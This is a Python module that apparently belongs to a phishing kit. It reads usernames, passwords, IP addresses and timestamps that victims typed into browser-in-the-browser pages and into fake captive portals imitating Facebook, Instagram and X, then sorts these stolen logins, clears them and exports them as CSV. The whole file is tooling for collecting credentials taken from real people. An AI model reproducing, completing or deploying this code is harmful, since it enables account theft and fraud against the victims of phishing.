import os
import sqlite3
import re
from datetime import datetime


def get_bitb_credentials(module_dir):
    cred_file = os.path.join(module_dir, "sites", "userpass", "usernames.txt")
    credentials = []
    if not os.path.exists(cred_file):
        return credentials

    with open(cred_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            entry = _parse_bitb_line(line)
            if entry:
                credentials.append(entry)
    return credentials


def _parse_bitb_line(line):
    pattern = r"^(.+?)\s+Username:\s*(.+?)\s+Pass:\s*(.+?)(?:\s+\[IP:\s*(.+?)\])?(?:\s+\[Time:\s*(.+?)\])?$"
    match = re.match(pattern, line)
    if not match:
        return None
    return {
        "module": "bitb",
        "site": match.group(1),
        "username": match.group(2),
        "password": match.group(3),
        "ip": match.group(4) or "",
        "timestamp": match.group(5) or "",
    }


def get_captive_credentials(module_dir):
    credentials = []
    portals = [
        {"name": "facebook", "port": 3000, "fields": ["email", "password"], "time_col": "login_time"},
        {"name": "instagram", "port": 3001, "fields": ["username", "password"], "time_col": None},
        {"name": "x", "port": 3002, "fields": ["username", "password"], "time_col": "timestamp"},
        {"name": "default", "port": 3003, "fields": ["email", "password"], "time_col": None},
    ]

    for portal in portals:
        db_path = os.path.join(module_dir, "captive", portal["name"], "users.db")
        if portal["name"] == "default":
            db_path = os.path.join(module_dir, "captive", "default-captive", "data.db")

        if not os.path.exists(db_path):
            continue

        try:
            conn = sqlite3.connect(db_path, timeout=2)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users ORDER BY id DESC LIMIT 500")
            rows = cursor.fetchall()
            for row in rows:
                row_dict = dict(row)
                
                # Get timestamp safely
                ts = ""
                if portal["time_col"] and portal["time_col"] in row_dict:
                    ts = row_dict[portal["time_col"]]
                elif "timestamp" in row_dict:
                    ts = row_dict["timestamp"]
                elif "login_time" in row_dict:
                    ts = row_dict["login_time"]

                entry = {
                    "module": "captive-autoredirect",
                    "site": portal["name"],
                    "username": row_dict.get(portal["fields"][0], ""),
                    "password": row_dict.get(portal["fields"][1], ""),
                    "ip": row_dict.get("ip_address", ""),
                    "timestamp": ts,
                }
                credentials.append(entry)
            conn.close()
        except (sqlite3.Error, KeyError) as e:
            print(f"Error parsing {portal['name']} db: {e}")
            continue

    return credentials


def get_all_credentials(bitb_dir):
    all_creds = get_bitb_credentials(bitb_dir)
    
    def get_time(cred):
        ts = cred.get("timestamp", "")
        return ts if ts else ""
        
    all_creds.sort(key=get_time, reverse=True)
    return all_creds


def clear_bitb_credentials(module_dir):
    cred_file = os.path.join(module_dir, "sites", "userpass", "usernames.txt")
    if os.path.exists(cred_file):
        open(cred_file, "w").close()


def export_credentials_csv(credentials):
    lines = ["Module,Site,Username,Password,IP,Timestamp"]
    for c in credentials:
        row = [
            c.get("module", ""),
            c.get("site", ""),
            c.get("username", ""),
            c.get("password", ""),
            c.get("ip", ""),
            c.get("timestamp", ""),
        ]
        escaped = ['"' + f.replace('"', '""') + '"' for f in row]
        lines.append(",".join(escaped))
    return "\n".join(lines)
